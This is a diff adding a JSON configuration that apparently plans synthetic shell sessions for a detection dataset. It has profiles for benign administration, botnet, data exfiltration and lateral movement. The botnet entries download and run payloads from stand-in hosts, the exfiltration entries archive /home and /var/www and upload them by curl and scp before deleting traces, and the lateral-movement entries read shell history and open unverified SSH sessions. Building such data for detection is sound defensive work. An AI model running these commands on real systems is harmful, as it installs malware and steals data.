@@ -1,0 +1,92 @@
+{
+  "source_profiles": "dataset_builder\\profiles_v2_isolated.json",
+  "sessions_per_profile": 2,
+  "chosen": {
+    "benign_admin": {
+      "seed": 1,
+      "include_held_out": false,
+      "planned_commands": [
+        [
+          "w",
+          "du -sh /var/log",
+          "cat /proc/meminfo",
+          "pwd",
+          "tail -n 50 /var/log/syslog"
+        ],
+        [
+          "who",
+          "date",
+          "df -h",
+          "systemctl status ssh",
+          "date",
+          "pwd"
+        ]
+      ]
+    },
+    "brute_force": {
+      "seed": 1,
+      "include_held_out": false,
+      "planned_commands": [
+        [],
+        []
+      ]
+    },
+    "botnet": {
+      "seed": 1,
+      "include_held_out": false,
+      "planned_commands": [
+        [
+          "shell",
+          "cd /var/tmp",
+          "curl -O http://pkg-repo.example/payload",
+          "system",
+          "chmod +x payload",
+          "sh payload"
+        ],
+        [
+          "cd /tmp",
+          "shell",
+          "wget http://192.0.2.40/malware.sh",
+          "chmod 777 malware.sh",
+          "./malware.sh"
+        ]
+      ]
+    },
+    "data_exfiltration": {
+      "seed": 1,
+      "include_held_out": true,
+      "planned_commands": [
+        [
+          "find /home -name '*.db' 2>/dev/null",
+          "tar cf /dev/shm/d.tar /var/www",
+          "curl -T /dev/shm/d.tgz http://192.0.2.10/u",
+          "rm -f /dev/shm/d.tgz /dev/shm/d.tar"
+        ],
+        [
+          "find /home -name '*.db' 2>/dev/null",
+          "du -sh /home /var/www",
+          "tar czf /var/tmp/d.tgz /home",
+          "scp /var/tmp/d.tar root@192.0.2.5:/tmp/",
+          "rm -f /var/tmp/d.tgz /var/tmp/d.tar"
+        ]
+      ]
+    },
+    "lateral_movement": {
+      "seed": 1,
+      "include_held_out": false,
+      "planned_commands": [
+        [
+          "arp -a",
+          "cat ~/.bash_history",
+          "ping -c 2 192.0.2.5",
+          "ssh -o StrictHostKeyChecking=no admin@192.0.2.5"
+        ],
+        [
+          "cat /etc/hosts",
+          "ssh root@192.0.2.5",
+          "whoami"
+        ]
+      ]
+    }
+  }
+}
